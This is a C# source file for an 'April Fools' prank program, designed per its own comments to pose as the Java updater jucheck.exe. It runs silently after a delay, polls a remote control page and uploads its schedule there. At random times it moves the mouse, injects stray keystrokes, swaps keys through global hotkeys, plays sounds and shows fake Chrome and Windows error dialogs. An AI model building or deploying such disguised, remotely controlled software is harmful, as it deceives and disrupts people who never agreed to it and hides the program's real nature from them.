﻿//#define _TESTING

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Threading;
using System.Windows.Forms;
using System.Media;
using Generics;

namespace AprilFools
{
    /*
     * This application will pose as java update application jucheck.exe with app decriptions and icon to match
     * 
     * Hotkeys:
     * CTRL+WIN+F2 Gloabl start
     * CTRL+WIN+F4 Gloabl pause
     * Alt+Shfit+F4 kill application - non reversable without manual restart
     * Alt+Shfit+1 Test Button - only runs in test mode
     * Alt+Shfit+2 Test Button - only runs in test mode
     * 
     * --ideas
     * make noise/tone every hour
     * start odd windows (like ads) - should clear over time or at least limit only 1 persisting to prevent a log in attack
     *  - popup random error mssages for chrome & memmory
	 * Add some narrow wander AI to mouse movement - seperate proc
     * hijack cut, copy paste? or screw with clipboard
     * hide desktop icons - win+d -> cntxt->v->d -> win+d
     * 
     * --done
     * Key swapper - swap keys around for a short period and/or clear after being pressed (dynamicly registering key hooks)
     * program wil launch and sit silently 
     * make a accelerating beeping noise perioticly
     * timed random mouse (at times and only for small lengths of time)
	 * 
     */

    public class Pranker
    {
        /// <summary>This is always true untill the application is closing</summary>
        private static bool _applicationRunning = true;
        /// <summary>This enabled or disabled any and all pranking action actions but does not kill the application.</summary>
        private static bool _allPrankingEnabled = true;// will be set false if delayed start
        /// <summary>sleep time for main thread</summary>
        private const int _mainThreadPollingInterval = 50;
        /// <summary>Sleep time for Control read thread. This is how often the control page will get polled</summary>
        private const int _externalControlThreadPollingInterval = 5*1000;

        private static bool _externalControlThreadRunning = true;
        private static bool _eraticMouseThreadRunning = false;
        private static bool _eraticKeyboardThreadRunning = false;
        private static bool _randomSoundThreadRunning = false;
        private static bool _popupThreadRunning = true;//should always run unless all popups are disabled

        private static PrankerPopup nextPopup = PrankerPopup.None;

        //Key mapping using assosiative arrays / dictionary
        public static List<Keys> keysToTrack = null;
        public static Dictionary<int, Keys> hotkeyIDs = null;
        public static Dictionary<Keys, string> keyMappings = null;
        /// <summary>Number of Keys to Map. decriement each map untill 0 when key mapping is disabled. If this is -1 there is no limit</summary>
        public static int keyMapCounter = 0;

        /// <summary>Buffer time at the start of the session when nothing will be scheduled. Default is 25 min.</summary>
        const int sessionDefaultStartDelay = 25 * 60 * 1000;
        /// <summary>Length of the session. Default of 8 hours when events will be randomly distributed.</summary>
        const int sessionDefaultDurration = 8 * 60 * 60 * 1000;
        private static EventScheduler<PrankerEvent> schedule;

        private static Thread externalControlThread;
        private static Thread eraticMouseThread;
        private static Thread eraticKeyboardThread;
        private static Thread randomSoundThread;
        private static Thread popupThread;

        /// <summary>This is the hard coded name of the control page. It is here in the code instead of the cmd line arg so that it cannot be read from the thread and traced back.</summary>
        private const string CTRL_WEB_PAGE_NAME = "prankController.php";
        private static string ctrlWebPage = null;
        private const int externalControlPageFailMaxAttempts = 10;
        private static int externalControlPageFailAttempts = 0;

        /// <summary>
        /// Entry point for prank application
        /// </summary>
        /// <param name="args"></param>
        static void Main(string[] args)
        {
            // Check for command line arguments
            int startDelay = 0;
            if (args.Length >= 1)
            {
                startDelay = Convert.ToInt32(args[0]);
                ctrlWebPage = args[1]+CTRL_WEB_PAGE_NAME;
            }

            InitApplication(startDelay);
        }

        #region Test code
        public static void TestCode1()
        {
            //schedule.AddEvent(PrankerEvent.RunEraticMouseThread20s, 0);
            //EnableKeyMapping();
            OpenPopupNow(PrankerPopup.ChromeGPUProcessCrash);
        }

        public static void TestCode2()
        {
            //DisableKeyMapping();
            OpenPopupNow(PrankerPopup.ChromeResources);
        }
        #endregion

        #region Session setup
        /// <summary>
        /// This funtion will setup which events will occur in the next 12 hours, then call its self to setup the next 12.
        /// </summary>
        /// <param name="scheduleType">The made of this schedule. Chose a preset type or a ran dome type. Default is EasyDay</param>
        /// <param name="sessionDurration">Default durration is 8 hours</param>
        /// <param name="loopSession">Should the session start over/re-generate when the durration is up.</param>
        /// <param name="startDelay">Buffer time at start of session when nothing will be scheduled</param>
        public static void CreateSchedule(PrankerSchedule scheduleType=PrankerSchedule.EasyDay, 
            int sessionDurration = sessionDefaultDurration, 
            bool loopSession = true, 
            int startDelay=sessionDefaultStartDelay)
        {
            List<PrankerEvent> plan = new List<PrankerEvent>(5);

            switch (scheduleType)
            {
                case PrankerSchedule.EasyDay:
                    plan.Add(PrankerEvent.CreateRandomPopupNow);
                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    break;
                case PrankerSchedule.MediumDay:
                    plan.Add(PrankerEvent.CreateRandomPopupNow);
                    plan.Add(PrankerEvent.CreateRandomPopupNow);
                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
                    plan.Add(PrankerEvent.RunEraticMouseThread5s);
                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
                    plan.Add(PrankerEvent.RunEraticMouseThread10s);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext5Keys);
                    plan.Add(PrankerEvent.MapNext10Keys);
                    break;
            }

            //spread plan throughout session randomly
            int eventTimeOffset;
            foreach (PrankerEvent e in plan)
            {
                eventTimeOffset = Generics.GenericsClass._random.Next(startDelay, sessionDurration);
                schedule.AddEvent(e, eventTimeOffset);
            }
            schedule.AddEvent(PrankerEvent.CreateSchedule, sessionDurration);
        }

        public enum PrankerSchedule
        {
            EasyDay,
            MediumDay,
        }
        #endregion

        #region External control
        private static void ExternalControlReadThread()
        {
            Console.WriteLine("ExternalControlReadThread Started");
            Thread.CurrentThread.Name = "ExternalControlReadThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (_applicationRunning && _externalControlThreadRunning)
            {
                ReadFromCtrlWebPage();
                Thread.Sleep(_externalControlThreadPollingInterval);
            }
        }

        private static void ReadFromCtrlWebPage()
        {
            string scheduleTimeStamp = "\n\n as of " + DateTime.Now;
            string downloadUrl = ctrlWebPage + "";
            string html = GenericsClass.DownloadHTML(downloadUrl);

            if (html != null)
            {
                bool anyNewCmds = false;
                //process html from page by pulling out new cmds

                string[] newCmds = html.Split('\n');
                foreach (string cmd in newCmds)
                {
                    if (cmd[0] == '<') continue;
                    if (cmd[0] != '_') break;
                    
                    //new cmd
                    string newCmd = cmd.Replace("_NEW_", "").Trim();
                    //schedule.
                }


                //if schedule changed re-upload current
                if (anyNewCmds)
                {
                }
            }
            else
            {
                if (++externalControlPageFailAttempts >= externalControlPageFailMaxAttempts)
                {
                    _externalControlThreadRunning = false;
                    Console.WriteLine("External control page timed out after "+externalControlPageFailAttempts+" attempts.");
#if _TESTING
                    //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
                    GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
#endif
                }
            }
            string uploadUrl = ctrlWebPage + "?upload=Y&uploaddata=" + schedule + scheduleTimeStamp;
            GenericsClass.DownloadHTML(uploadUrl);
        }
        #endregion

        #region Key Mapping
        //using assosiative arrays / dictionary
        private static void DefineKeyMappings()
        {
            hotkeyIDs = new Dictionary<int, Keys>();
            keyMappings = new Dictionary<Keys, string>();

            //These keys will be registered as hoykeys
            keysToTrack = new List<Keys>(36);
            #region mapped Key list
            keysToTrack.Add(Keys.A); keyMappings.Add(Keys.A, "s");
            keysToTrack.Add(Keys.B); keyMappings.Add(Keys.B, "b");
            keysToTrack.Add(Keys.C); keyMappings.Add(Keys.C, "c");
            keysToTrack.Add(Keys.D); keyMappings.Add(Keys.D, "d");
            keysToTrack.Add(Keys.E); keyMappings.Add(Keys.E, "e");
            keysToTrack.Add(Keys.F); keyMappings.Add(Keys.F, "f");
            keysToTrack.Add(Keys.G); keyMappings.Add(Keys.G, "g");
            keysToTrack.Add(Keys.H); keyMappings.Add(Keys.H, "h");
            keysToTrack.Add(Keys.I); keyMappings.Add(Keys.I, "i");
            keysToTrack.Add(Keys.J); keyMappings.Add(Keys.J, "j");
            keysToTrack.Add(Keys.K); keyMappings.Add(Keys.K, "k");
            keysToTrack.Add(Keys.L); keyMappings.Add(Keys.L, "l");
            keysToTrack.Add(Keys.M); keyMappings.Add(Keys.M, "m");
            keysToTrack.Add(Keys.N); keyMappings.Add(Keys.N, "n");
            keysToTrack.Add(Keys.O); keyMappings.Add(Keys.O, "o");
            keysToTrack.Add(Keys.P); keyMappings.Add(Keys.P, "p");
            keysToTrack.Add(Keys.Q); keyMappings.Add(Keys.Q, "q");
            keysToTrack.Add(Keys.R); keyMappings.Add(Keys.R, "r");
            keysToTrack.Add(Keys.S); keyMappings.Add(Keys.S, "a");
            keysToTrack.Add(Keys.T); keyMappings.Add(Keys.T, "t");
            keysToTrack.Add(Keys.U); keyMappings.Add(Keys.U, "u");
            keysToTrack.Add(Keys.V); keyMappings.Add(Keys.V, "v");
            keysToTrack.Add(Keys.W); keyMappings.Add(Keys.W, "w");
            keysToTrack.Add(Keys.X); keyMappings.Add(Keys.X, "x");
            keysToTrack.Add(Keys.Y); keyMappings.Add(Keys.Y, "y");
            keysToTrack.Add(Keys.Z); keyMappings.Add(Keys.Z, "z");
            keysToTrack.Add(Keys.D0); keyMappings.Add(Keys.D0, "-");//shifted 1 over
            keysToTrack.Add(Keys.D1); keyMappings.Add(Keys.D1, "2");
            keysToTrack.Add(Keys.D2); keyMappings.Add(Keys.D2, "3");
            keysToTrack.Add(Keys.D3); keyMappings.Add(Keys.D3, "4");
            keysToTrack.Add(Keys.D4); keyMappings.Add(Keys.D4, "5");
            keysToTrack.Add(Keys.D5); keyMappings.Add(Keys.D5, "6");
            keysToTrack.Add(Keys.D6); keyMappings.Add(Keys.D6, "7");
            keysToTrack.Add(Keys.D7); keyMappings.Add(Keys.D7, "8");
            keysToTrack.Add(Keys.D8); keyMappings.Add(Keys.D8, "9");
            keysToTrack.Add(Keys.D9); keyMappings.Add(Keys.D9, "0");
            #endregion
        }

        public static void RegisterAllKeyMappings()
        {
            DefineKeyMappings();

            int id;
            foreach (Keys k in keysToTrack)
            {
                id = HotKeyManager.RegisterHotKey(0, k);
                hotkeyIDs[id] = k;
            }
        }

        public static void UnregisterAllKeyMappings()
        {
            foreach (KeyValuePair<int, Keys> pair in hotkeyIDs)
            {
                // do something with entry.Value or entry.Key
                HotKeyManager.UnregisterHotKey(pair.Key);
            }

            hotkeyIDs = null;
            keyMappings = null;
        }

        public static bool MapKey(HotKeyEventArgs e)
        {
            bool mapped = false;
            
            if(e.Modifiers!=0)
                return mapped;

            Keys pressedKey;
            if (hotkeyIDs.TryGetValue(e.ID,out pressedKey))
            {
                //map this key
                string output = keyMappings[pressedKey];
                //super ugly hack by disabling all mapping just to redo it a line latter but it works - necisarry to prevent call stack loop
                UnregisterAllKeyMappings();
                SendKeys.SendWait(output);
                RegisterAllKeyMappings();

                mapped = true;

                if (keyMapCounter != -1)
                {
                    keyMapCounter--;
                    if (keyMapCounter == 0)
                        DisableKeyMapping();
                }
            }
            return mapped;
        }

        public static void EnableKeyMapping(int count=-1)
        {
            if (count < -1) count = -1;
            else if (count == 0) { DisableKeyMapping(); return; }

            //new setting is on - check if already on
            if(keyMapCounter!=-1)
            {
                //enable hotkeys for mapping
                RegisterAllKeyMappings();
            }
            keyMapCounter = count;
        }

        public static void DisableKeyMapping()
        {
            keyMapCounter = 0;
            UnregisterAllKeyMappings();
            GC.Collect();//pretty sure this is doing absolutely nothing
        }
        #endregion

        #region Thread Functions
        /// <summary>
        /// This thread will randomly affect the mouse movements to screw with the end user
        /// </summary>
        public static void EraticMouseThread()
        {
            Console.WriteLine("EraticMouseThread Started");
            Thread.CurrentThread.Name = "EraticMouseThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            const int moveVariance = 10;
            const int mouseMoveInteral = 50;
            const int oddsOfMoving = 25;

            int moveX = 0;
            int moveY = 0;

            while (_applicationRunning)
            {
                if (_allPrankingEnabled && _eraticMouseThreadRunning)
                {
                    // Console.WriteLine(Cursor.Position.ToString());

                    if (GenericsClass._random.Next(100) > 100-oddsOfMoving)
                    {
                        // Generate the random amount to move the cursor on X and Y
                        moveX = GenericsClass._random.Next(2 * moveVariance + 1) - moveVariance;
                        moveY = GenericsClass._random.Next(2 * moveVariance + 1) - moveVariance;

                        // Change mouse cursor position to new random coordinates
                        Cursor.Position = new System.Drawing.Point(
                            Cursor.Position.X + moveX,
                            Cursor.Position.Y + moveY);
                    }
                }
                Thread.Sleep(mouseMoveInteral);
            }
        }

        /// <summary>
        /// This will generate random keyboard output to screw with the end user
        /// </summary>
        public static void EraticKeyboardThread()
        {
            Console.WriteLine("EraticKeyboardThread Started");
            Thread.CurrentThread.Name = "EraticKeyboardThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (_applicationRunning)
            {
                if (_allPrankingEnabled && _eraticKeyboardThreadRunning)
                {
                    if (GenericsClass._random.Next(100) >= 95)
                    {
                        // Generate a random capitol letter
                        char key = (char)(GenericsClass._random.Next(26) + 65);

                        // 50/50 make it lower case
                        if (GenericsClass._random.Next(2) == 0)
                        {
                            key = Char.ToLower(key);
                        }

                        SendKeys.SendWait(key.ToString());
                    }
                }
                Thread.Sleep(GenericsClass._random.Next(500));
            }
        }

        /// <summary>
        /// This will play system sounds at random to screw with the end user
        /// </summary>
        public static void RandomSoundThread()
        {
            Console.WriteLine("RandomSoundThread Started");
            Thread.CurrentThread.Name = "RandomSoundThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            while (_applicationRunning)
            {
                if (_allPrankingEnabled && _randomSoundThreadRunning)
                {
                    // Determine if we're going to play a sound this time through the loop (20% odds)
                    //if (_random.Next(100) >= 80)

                    // Randomly select a system sound
                    int sound = GenericsClass._random.Next(5);
                    sound = 3;
                    switch (sound)
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(500);
            }
        }

        /// <summary>
        /// This thread will popup fake error notifications to make the user go crazy and pull their hair out
        /// </summary>
        public static void PopupThread()
        {
            Console.WriteLine("PopupThread Started");
            Thread.CurrentThread.Name = "PopupThread";
            Thread.CurrentThread.IsBackground = true;
            Thread.CurrentThread.Priority = ThreadPriority.BelowNormal;

            //create weighted popup probabilities for 'random' choice
            Choice popupChoice = new Choice();
            Possibility pos_chromeBadDay = popupChoice.AddPossibility(1, PrankerPopup.ChromeBadDay.ToString());
            Possibility pos_chromeGPUProcessCrashed = popupChoice.AddPossibility(5, PrankerPopup.ChromeGPUProcessCrash.ToString());
            Possibility pos_chromeResources = popupChoice.AddPossibility(20, PrankerPopup.ChromeResources.ToString());
            Possibility pos_windowsResources = popupChoice.AddPossibility(20, PrankerPopup.WindowsResources.ToString());
            //Possibility pos_ie = popup.AddPossibility(20, "IE");
            //Possibility pos_calc = popup.AddPossibility(1, "Calc");

            Possibility rndChoice;
            var popupTypes = Enum.GetValues(typeof(PrankerPopup));
            while (_applicationRunning)
            {
                if (_allPrankingEnabled && _popupThreadRunning)
                {
                    if (nextPopup == PrankerPopup.Random)
                    {
                        // Determine which message to show user
                        rndChoice = popupChoice.RandomChoice();
                            
                        foreach (PrankerPopup type in popupTypes)
                        {
                            if (type.ToString().Equals(rndChoice.Name))
                            {
                                nextPopup = type;
                                break;
                            }
                        }

                    }

                    switch (nextPopup)
                    {
                        case PrankerPopup.None:
                        case PrankerPopup.Random:
                            break;
                        case PrankerPopup.ChromeGPUProcessCrash:
                            DialogResult result = DialogResult.Retry;
                                while(result == DialogResult.Retry)
                                    result = MessageBox.Show("Chrome GPU process has crashed.",
                                        "Chrome", MessageBoxButtons.RetryCancel, MessageBoxIcon.Warning);
                            break;
                        case PrankerPopup.ChromeBadDay:
                            MessageBox.Show("Chrome is having a bad day.\nIt is advised you save your work and restart your computer.",
                                "Chrome", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            break;
                        case PrankerPopup.ChromeResources:
                            MessageBox.Show("Chrome is dangerously low on resources.",
                                "Chrome", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            break;
                        case PrankerPopup.WindowsResources:
                            MessageBox.Show("Your system is running low on resources",
                                "Microsoft Windows",MessageBoxButtons.OK,MessageBoxIcon.Warning);
                            break;
                    }
                    nextPopup = PrankerPopup.None;//clear till this is called again
                }
                try
                {
                    Thread.Sleep(100);
                }
                catch (ThreadInterruptedException) { }
            }
        }

        public static void OpenPopupNow(PrankerPopup popup)
        {
            nextPopup = popup;
            popupThread.Interrupt();
        }

        public static void ToggleHiddenDesktopIcons()
        {
            //SendKeys.SendWai
        }

        public enum PrankerPopup
        {//cant do values here because it would break the switch
            None,
            Random,
            ChromeResources,
            ChromeBadDay,
            ChromeGPUProcessCrash,
            WindowsResources,
        }
        #endregion

        #region Core threads and functionality
        private static void InitApplication(int startDelay)
        {
            Thread.CurrentThread.Name = "Pranker Main Thread";
            Console.WriteLine("April Fools Prank by: Dougie Fresh");

#if _TESTING
            //if (MessageBox.Show("Running in testing mode. Press OK to start.","\"The\" App",MessageBoxButtons.OKCancel,MessageBoxIcon.Warning) == DialogResult.Cancel)return;
            GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
            GenericsClass.Beep(BeepPitch.Medium, BeepDurration.Long);
#endif
            //register hotkey(s)
            Console.WriteLine("Registering Hotkeys");
            HotKeyManager.HotKeyPressed += new EventHandler<HotKeyEventArgs>(HotKeyPressed);
            HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F2);
            HotKeyManager.RegisterHotKey((KeyModifiers.Control | KeyModifiers.Windows), Keys.F4);
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.F4);
#if _TESTING
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.D1);
            HotKeyManager.RegisterHotKey((KeyModifiers.Alt | KeyModifiers.Shift), Keys.D2);
#endif

            Console.WriteLine("Starting Core Threads");
            externalControlThread = new Thread(new ThreadStart(ExternalControlReadThread));
            eraticMouseThread = new Thread(new ThreadStart(EraticMouseThread));
            eraticKeyboardThread = new Thread(new ThreadStart(EraticKeyboardThread));
            randomSoundThread = new Thread(new ThreadStart(RandomSoundThread));
            popupThread = new Thread(new ThreadStart(PopupThread));

            Console.WriteLine("Build Schedule");
            schedule = new EventScheduler<PrankerEvent>();

            //setup delayed start
            if (startDelay > 0)
            {
                _allPrankingEnabled = false;
                schedule.AddEvent(PrankerEvent.StartPranking, startDelay * 1000);
            }

            CreateSchedule(PrankerSchedule.EasyDay, sessionDefaultDurration, true, sessionDefaultStartDelay);

            // Start all of the threads
            externalControlThread.Start();
            eraticMouseThread.Start();
            eraticKeyboardThread.Start();
            randomSoundThread.Start();
            popupThread.Start();

            MainBackgroundThread();
        }

        private static void MainBackgroundThread()
        {
            //dont start a new thread, just use the base thread
            while (_applicationRunning)
            {
                //check for timed events here
                //act on all scheduled events
                while (schedule.NextEvent != null && schedule.NextEvent.Time <= DateTime.Now)
                {
                    ProcessEvent(schedule.NextEvent.Event);
                    schedule.RemoveNextEvent();
                }

                Thread.Sleep(_mainThreadPollingInterval);
            }

            ExitApplication();
        }

        public static void StartPranking()
        {
#if _TESTING
            if (!_allPrankingEnabled)
            {
                GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
                GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
            }
            GenericsClass.Beep(BeepPitch.High, BeepDurration.Short);
#endif

            _allPrankingEnabled = true;
        }

        public static void PausePranking()
        {
#if _TESTING
            if (_allPrankingEnabled)
            {
                GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
                GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
            }
            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Short);
#endif

            _allPrankingEnabled = false;
        }

        public static void ExitApplication()
        {

#if _TESTING
            //MessageBox.Show("Exiting application.","\"The\" App",MessageBoxButtons.OK,MessageBoxIcon.None);

            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
            GenericsClass.Beep(BeepPitch.Low, BeepDurration.Long);
#endif

            Console.WriteLine("Terminating all threads");
            // Kill all threads and exit application
            eraticMouseThread.Abort();
            eraticKeyboardThread.Abort();
            randomSoundThread.Abort();
            popupThread.Abort();
        }
        #endregion

        #region Events and handling
        static void HotKeyPressed(object sender, HotKeyEventArgs e)
        {

            if (e.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && e.Key == Keys.F2)
            {
                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Start Pranking");
                StartPranking();
            }
            else if (e.Modifiers == (KeyModifiers.Control | KeyModifiers.Windows) && e.Key == Keys.F4)
            {
                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Stop Pranking");
                PausePranking();
            }
            else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.F4)
            {
                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Kill Application");
                //stop everything and kill application
                _applicationRunning = false;
            }
            else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.D1)
            {
                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 1");
                TestCode1();
            }
            else if (e.Modifiers == (KeyModifiers.Alt | KeyModifiers.Shift) && e.Key == Keys.D2)
            {
                Console.WriteLine("HotKeyManager_HotKeyPressed() - " + e.Modifiers + "+" + e.Key + " - Test Key 2");
                TestCode2();
            }
            else if (keyMapCounter != 0 && !MapKey(e))//try to map this unknown key (combo are ignored)
            {
                //uncaught hotkey
                Console.WriteLine("HotKeyManager_HotKeyPressed() - UnActioned - " + e.Modifiers + "+" + e.Key + "");
            }
        }

        public static void ProcessEvent(PrankerEvent e)
        {
            bool handled = true;
            switch (e)
            {
                case PrankerEvent.DisableStartup:
                    //TODO handle this case
                    break;
                case PrankerEvent.StartPranking:
                    StartPranking();
                    break;
                case PrankerEvent.PausePranking:
                    PausePranking();
                    break;
                case PrankerEvent.KillApplication:
                    _applicationRunning = false;
                    break;
                case PrankerEvent.StartEraticMouseThread:
                    _eraticMouseThreadRunning = true;
                    break;
                case PrankerEvent.StopEraticMouseThread:
                    _eraticMouseThreadRunning = false;
                    break;
                case PrankerEvent.RunEraticMouseThread5s:
                    _eraticMouseThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 5 * 1000);
                    break;
                case PrankerEvent.RunEraticMouseThread10s:
                    _eraticMouseThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 10 * 1000);
                    break;
                case PrankerEvent.RunEraticMouseThread20s:
                    _eraticMouseThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticMouseThread, 20 * 1000);
                    break;
                case PrankerEvent.StartEraticKeyboardThread:
                    _eraticKeyboardThreadRunning = true;
                    break;
                case PrankerEvent.StopEraticKeyboardThread:
                    _eraticKeyboardThreadRunning = false;
                    break;
                case PrankerEvent.RunEraticKeyboardThread20s:
                    _eraticKeyboardThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopEraticKeyboardThread, 20 * 1000);
                    break;
                case PrankerEvent.StartRandomSoundThread:
                    _randomSoundThreadRunning = true;
                    break;
                case PrankerEvent.StopRandomSoundThread:
                    _randomSoundThreadRunning = false;
                    break;
                case PrankerEvent.RunRandomSoundThread20s:
                    _randomSoundThreadRunning = true;
                    schedule.AddEvent(PrankerEvent.StopRandomSoundThread, 20 * 1000);
                    break;
                case PrankerEvent.CreateRandomPopupNow:
                    nextPopup = PrankerPopup.Random;
                    break;
                case PrankerEvent.StartMappingAllKeys:
                    EnableKeyMapping();
                    break;
                case PrankerEvent.StopMappingAllKeys:
                    DisableKeyMapping();
                    break;
                case PrankerEvent.MapNext5Keys:
                    EnableKeyMapping(5);
                    break;
                case PrankerEvent.MapNext10Keys:
                    EnableKeyMapping(10);
                    break;
                case PrankerEvent.CreateSchedule:
                    CreateSchedule();
                    break;
                case PrankerEvent.RebuildSchedule:
                    schedule.ClearSchedule();
                    CreateSchedule();
                    break;
                default:
                    handled = false;
                    break;
            }
            if(handled)
                Console.WriteLine("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e);
            else
                Console.WriteLine("ProcessEvent(PrankerEvent) at " + DateTime.Now + " - " + e + " - NOT HANDLED");
        }
        
        /// <summary>
        /// List of Events that can occur in this app
        /// </summary>
        public enum PrankerEvent
        {
            StartPranking,
            PausePranking,
            KillApplication,

            CreateSchedule,
            RebuildSchedule,
            DisableStartup, //this is in case I dont want the application to run at all even in the application is launched - must be checked in external source at startup

            //mouse events
            StartEraticMouseThread,
            StopEraticMouseThread,
            RunEraticMouseThread5s,
            RunEraticMouseThread10s,
            RunEraticMouseThread20s,

            //keyboard events
            StartEraticKeyboardThread,
            StopEraticKeyboardThread,
            RunEraticKeyboardThread20s,
            StartMappingAllKeys,
            StopMappingAllKeys,
            MapNext5Keys,
            MapNext10Keys,

            //Sound events
            PlayBombBeeping,
            StartRandomSoundThread,
            StopRandomSoundThread,
            RunRandomSoundThread20s,

            //popup events
            CreateRandomPopupNow,
        }
        #endregion
    }

}